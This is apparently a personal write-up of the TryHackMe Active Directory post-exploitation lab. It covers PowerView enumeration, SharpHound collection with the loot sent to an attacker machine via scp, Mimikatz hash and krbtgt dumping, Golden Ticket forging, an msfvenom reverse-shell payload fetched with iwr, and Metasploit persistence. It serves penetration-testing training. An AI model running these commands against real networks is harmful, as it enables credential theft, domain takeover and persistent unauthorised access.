___________________

# **POST Exploitation AD TryHackMe**

- In this **Task 2**, we will work with **PowerView**, which is written in **PowerShell** and is part of the popular framework **PowerSploit**. It is commonly used by pentesters to **enumerate and exploit information from an Active Directory (AD)** environment.
    
    For this type of exploitation, we **require valid credentials**, even if they belong to a **low-privileged user**.
    

<img width="1199" height="333" alt="Captura de pantalla 2026-02-28 131324" src="https://github.com/user-attachments/assets/9d3067e3-31d3-4102-8614-70848d1bb5eb" />

For this lab, **TryHackMe** provides valid credentials.

- **Connection via SSH**

```
sshpass -p 'P@$$W0rd' ssh -o StrictHostKeyChecking=no Administrator@10.66.186.24 "cmd.exe"
```

- **StrictHostKeyChecking=no**  
    Allows the connection to be established **automatically**, without asking whether to trust the server key.
    
- **"cmd.exe"**  
    Forces the session to start directly in a **Windows CMD shell**.


<img width="760" height="26" alt="Captura de pantalla 2026-02-28 174611" src="https://github.com/user-attachments/assets/97f45b8b-8cfe-4064-a8d5-db8240c619bc" />
  
<img width="716" height="578" alt="Captura de pantalla 2026-02-28 180103" src="https://github.com/user-attachments/assets/18bcc7c4-a136-4e55-ad73-94247c0ce5e4" />

Here we show how we connect and start working with **PowerView**.

### **1. Bypass execution policy**
powershell -ep bypass
    The `-ep bypass` flag **bypasses PowerShell execution policies**, allowing scripts to run freely.
### **2. Load PowerView**
. .\Downloads\PowerView.ps1
### **3. Enumerate domain users**
Get-NetUser | select cn
### **4. Enumerate domain groups**
Get-NetGroup -GroupName *admin*

<img width="623" height="123" alt="Captura de pantalla 2026-02-28 184117" src="https://github.com/user-attachments/assets/7e2fece0-7e57-4f8b-8a50-364ef15a68b6" />

- **Invoke-ShareFinder** is a PowerShell function used to **discover shared folders (SMB shares)** across a Windows network.

It is used here to answer:

***What is the shared folder that is not set by default?***

- This refers to **non-default shares**, typically created by users and often containing:
    
    - Misconfigured permissions
    - Sensitive data
    - Privilege escalation opportunities

⚠️ Important difference:

- **SMBMap** → runs from **Linux attacker machine**
- **Invoke-ShareFinder** → runs **inside the victim (PowerShell / AD context)**

<img width="658" height="149" alt="Captura de pantalla 2026-02-28 193335" src="https://github.com/user-attachments/assets/338dfe3b-447e-4d38-b251-09bc54a36f75" />

```
Get-NetComputer -FullData | select operatingsystem
```

- **Get-NetComputer** → lists domain computers
- **-FullData** → retrieves **all available attributes**
- **Select operatingsystem** → filters only the OS field

---

# **Task 3 – BloodHound & SharpHound**

- **BloodHound** → tool to **visualize relationships in Active Directory**
- **SharpHound** → data collector that extracts AD data for BloodHound

     **BloodHound** is a specific tool designed to analyze and visualize relationships within Active Directory (AD) represented in a very graphical way, and **sharphound** helps us send complete information from **AD** to **BloodHound** for interpretation.

⚠️ Important: Use **BloodHound Legacy**, NOT Community Edition (CE)

```
sudo apt update && sudo apt install bloodhound -y
```

- CE is not available via apt repositories.

```
wget https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip
```

```
unzip BloodHound-win32-x64.zip
```
    Collectors/SharpHound.exe

- With this installed, we will now define the credentials.

```
neo4j console
```

```
Default credentials:
```

```
neo4j:neo4j
```


- With this ready and already inside the victim machine, we're going to use the installed **SharpHound** to extract the **loop.zip** file.

    Attacker machine
```
cd /home/kali/Desktop/AD/BloodHound-win32-x64/resources/app/Collectors/  
sudo python3 -m http.server 80
```

    Victim machine:
```
iwr -Uri "http://TU_IP_KALI/SharpHound.exe" -OutFile "C:\Users\Public\s.exe"
```

- **iwr (Invoke-WebRequest)** allows file download directly from PowerShell
- More reliable than netcat in Windows environments


- Execute **SharpHound**

```
cd C:\Users\Public\  
.\s.exe --CollectionMethods All --Domain CONTROLLER.local --ZipFileName loot.zip
```

- Collects **full AD data**
- Outputs a **loot.zip file**

- Transfer  **loot.zip**

    Victim
```
scp "C:\Users\Public\20260303155423_loot.zip" kali@192.168.201.79:/home/kali/Desktop/AD/
```

    Attacker
```
sudo systemctl start ssh  
sudo chmod 777 /home/kali/Desktop/AD/
```

⚠️ Important:

- `scp` depends on **SSH**
- Permissions must allow writing

- **Using BloodHound**

     Enter the username and password **neo4j** as we set it up previously.

<img width="1014" height="724" alt="Captura de pantalla 2026-03-03 193826" src="https://github.com/user-attachments/assets/ce9dcaea-21a3-4b00-b6ec-9f9ebf4dc1c8" />
     We see how **BloodHound** gives us the option to list the domain structures
 
<img width="1171" height="756" alt="Captura de pantalla 2026-03-03 194154" src="https://github.com/user-attachments/assets/b6ed056c-bcee-4c48-83b8-2604ccb98b15" />
    
For example, extracting information from Kerberos

<img width="495" height="685" alt="Captura de pantalla 2026-03-03 194754" src="https://github.com/user-attachments/assets/b457dc08-7108-4de6-b7c5-d4ef1bc4efae" />

<img width="1850" height="422" alt="Captura de pantalla 2026-03-03 195333" src="https://github.com/user-attachments/assets/42b1f8ca-6305-4ed0-a9eb-b70c3c31204b" />

- You can:
    - Visualize domain structure
    - Analyze Kerberos relationships
    - Inspect detailed node info

## **Key Points**

### 1

**SCP** is critical → enables secure file transfer via SSH
### 2

**iwr (Invoke-WebRequest)** in PowerShell = equivalent to **netcat in Linux**  
→ controlled input/output channel for file transfer
### 3

Understanding **APT vs GitHub repos** is important:

- APT → stable but outdated
- GitHub → latest tools (preferred for pentesting)



# **Task 4 – Hash Dumping & Cracking**

- We're going to work with **hash dumping** and how to **crack them**. As a first tool, we'll use **mimikatz.exe** which allows us to list the **hashes** of a **domain**.

-  execute **Mimikatz**

```
.\mimikatz.exe
```

- Elevate privileges:

```
privilege::debug
```

- Dump hashes:

```
lsadump::lsa /patch
```
<img width="1022" height="612" alt="Captura de pantalla 2026-03-04 033821" src="https://github.com/user-attachments/assets/e29fcb17-b3e9-4b23-9107-ed53ef450753" />

- **Cracking hashes**
Due to VM limitations, **hashcat may not work properly**

- Alternatives:

    - **John the Ripper**
    - **hashes.com**

<img width="841" height="243" alt="Captura de pantalla 2026-03-04 043516" src="https://github.com/user-attachments/assets/fc2e7b6d-ef08-4e96-9254-f2bc949dfd5e" />

<img width="1075" height="389" alt="Captura de pantalla 2026-03-04 043449" src="https://github.com/user-attachments/assets/ec199354-05f9-4986-9d98-7fd7c8248297" />

<img width="1843" height="407" alt="Captura de pantalla 2026-03-04 172737" src="https://github.com/user-attachments/assets/c4f29d24-7040-4d66-8c82-0ed2ec7131b9" />




# **Task 5 – Golden Ticket Attack**

- This attack targets the **KRBTGT account hash** to gain **full domain control**

- KRBTGT is responsible for:
-
    - Issuing Kerberos tickets
    - Acting as the **KDC (Key Distribution Center)**

- Extracting **KRBTGT hash**

```
.\mimikatz.exe  
```

```
privilege::debug  
```

```
lsadump::lsa /inject /name:krbtgt
```
     - This returns the **Hash** and **security identifier** of the account

<img width="737" height="402" alt="Captura de pantalla 2026-03-04 190319" src="https://github.com/user-attachments/assets/d1096342-d168-444f-9787-8f880ee0e234" />

---

- - With that information, we will request the **Golden Ticket** using the following payload and syntax **Generate Golden Ticket**

```
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
```

<img width="1376" height="436" alt="Captura de pantalla 2026-03-04 191154" src="https://github.com/user-attachments/assets/25d35b44-04cd-4468-b725-eb550ba34245" />

✔️ This confirms the **Golden Ticket is created**



# **Task 6 – Domain Analysis Tools**

- In **task6** we will use a tool that allows us to analyze **Domains** in a deeper and more professional way.

    Connect via **RDP**, then open: **Server Manager → Tools**

<img width="1024" height="750" alt="Captura de pantalla 2026-03-04 231701" src="https://github.com/user-attachments/assets/6530c04e-3a35-4ecd-9a3f-8bc4d40129a5" />

### Key tools:

**Active Directory Users and Computers (ADUC)**: For managing accounts and groups.

**DNS Manager**: Crucial in Active Directory. If you control DNS, you can redirect network traffic to your own machine (poisoning).

**Group Policy Management**: This is where the real power lies. You can create a policy (GPO) that says: "Run this malicious script on all company PCs upon login."

**Active Directory Sites and Services**: To see how information is replicated across different servers if the company is large.

**Event Viewer**: This is the historical log of actions. Its function is to audit who did what, when, and from where, allowing you to detect logins, password changes, or object creation using specific event IDs (such as **4624** for successful logins).


<img width="372" height="700" alt="Captura de pantalla 2026-03-04 231754" src="https://github.com/user-attachments/assets/58c758ec-0f92-4c6b-b141-0238f7a2ae4a" />
 

<img width="784" height="532" alt="Captura de pantalla 2026-03-04 231903" src="https://github.com/user-attachments/assets/519e501d-477b-4df5-bf90-3836278d151f" />
     The Event Viewer's Perspective

<img width="813" height="585" alt="Captura de pantalla 2026-03-04 232132" src="https://github.com/user-attachments/assets/3af077df-453b-4a47-a201-c5b36495e715" />
    Perspective from the ***Active Directory Users and Computers***

<img width="1828" height="423" alt="Captura de pantalla 2026-03-04 234412" src="https://github.com/user-attachments/assets/4f65d9e1-6141-4bc5-8587-3c61f7e30fcd" />



# **Persistence with Metasploit**

In this task, we'll work on maintaining an active connection after a disconnection or loss of it. We'll be using tools like msfvenom for this.

Here's a step-by-step guide on how to perform this process in a standard and basic way.

### **1. Generate payload**

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe
```
### **2. Transfer payload**

### Attacker:

```
cd /home/kali/  
sudo python3 -m http.server 80
```

### Victim:

```
iwr -Uri "http://VPN IP/shell.exe" -OutFile "C:\Users\Administrator\shell.exe"
```


### **3. Configure Metasploit**

```
msfconsole  
use exploit/multi/handler  
set LHOST <IP>  
set LPORT 4444  
set payload windows/meterpreter/reverse_tcp
```
     We verified the correctly configured IP address and port using the show options command

```
exploit
```
     And at the same time we run the exploit on the victim machine

- Execute payload on victim:

```
shell.exe
```

### **4. Persistence module**

```
use exploit/windows/local/persistence  
```
     - With this set up, we will prevent ourselves from continuing to have access to the connection if it drops.

```
set LHOST <VPN IP>  
set LPORT 5555  
```
     In this case, it has to be a different port than the one used by Meterpreter, because this ensures the connection remains active even if the Meterpreter connection fails. This is the essence of this attack.

```
set SESSION 1  
run
```
    And with this, we should have a new Meterpreter ready in case the connection drops.

- Something important here is that in certain exceptions, it's necessary to add a listener to the membership module.

    The importance of this lies in how, as attackers, we can successfully maintain a connection even if it's affected. This step-by-step guide is a basic approach; however, we'll clarify certain concepts later.

**SESSIONS:** Sessions are the communication channel between the attacker machine and the target machine. Sessions allow us to interact with the victim machine, including the execution of post-exploitation exploits.

- Sessions = communication channel attacker ↔ victim

<img width="1261" height="218" alt="Captura de pantalla 2026-03-06 014231" src="https://github.com/user-attachments/assets/07e83ebc-427e-476a-a0dc-72ca4d162735" />
## **Types of sessions**

**Meterpreter**: A powerful, dynamic payload that provides full access to the target machine, including a range of post-exploitation features such as keylogging, webcam control, and privilege escalation.
    
    **Shell**: A basic command-line shell that allows the attacker to execute commands on the compromised system.
    
    **VNC**: A graphical user interface (GUI) that allows the attacker to interact with the target system as if they were physically sitting at it.

**Meterpreter** is one of the most powerful and flexible payloads in Metasploit. When you interact with a Meterpreter session, you gain full access to the compromised machine, including the ability to execute a variety of post-exploitation commands.
use modules

    Basic Meterpreter Commands


- **sysinfo**: Displays system information such as the operating system architecture, and hostname of the compromised machine.  
    `meterpreter > sysinfo`
- **getuid**: Displays the user ID of the current user on the target system.  
    `meterpreter > getuid`
- **ps**: Lists running processes on the compromised machine.  
    `meterpreter > ps`
- **hashdump**: Dumps the password hashes from the target system’s SAM file (Windows systems only).  
    `meterpreter > hashdump`
- **download**: Downloads a file from the target system to your local machine.  
    `meterpreter > download /path/to/target/file /path/to/local/file`
- **upload**: Uploads a file from your local machine to the target system.  
    `meterpreter > upload /path/to/local/file /path/to/target/file`
- **shell**: Starts a command shell on the compromised machine, providing a more traditional command-line interface.  
    `meterpreter > shell`
- **getsystem**: Attempts to escalate privileges to the highest available level on the target system (e.g., SYSTEM on Windows or root on Linux).  
    `meterpreter > getsystem`
- **background**: Sends the current session into the background, allowing you to continue working with Metasploit while keeping the session active.  
    `meterpreter > background`
# **Persistence Techniques**

1. **Persistence through system services**
- Creates a **service in Windows or daemon in Linux** that runs every time the system starts.

    **Example**: `post/windows/manage/persistence` allows you to install a service that automatically starts a Meterpreter session when the system boots.

2. **Scheduled tasks or CronJobs**
- Executes scripts or sessions at specific intervals or at login.

    **Example**: In Windows, you can use `schtasks` to schedule the execution of a payload; In Linux, create a **cron job** in `/etc/cron.d/` or `/etc/crontab`.

3. **Startup Files and User Profiles**
- Modify files such as `.bashrc`, `.profile`, or `startup folder` to execute code at the login of a specific user.

    - **Example**: A payload is added to `.bashrc` in Linux so that every time the user opens the terminal, the remote session is started.

- There is the `use` command, which is used to specify which command to use. Another very important one is...

- In the Metasploit msfconsole, the `search` command allows you to search for modules based on specific criteria:

    Syntax: `search [criteria]`
    Example: `search platform:window`



<img width="931" height="233" alt="Captura de pantalla 2026-03-06 025135" src="https://github.com/user-attachments/assets/7e596c96-3d97-4741-9fe9-6452c6c4a653" />

## **show options**

Displays required parameters:

<img width="1070" height="603" alt="Captura de pantalla 2026-03-06 013946" src="https://github.com/user-attachments/assets/bb8e384f-91d4-4ea5-84cc-f14038cc55e9" />

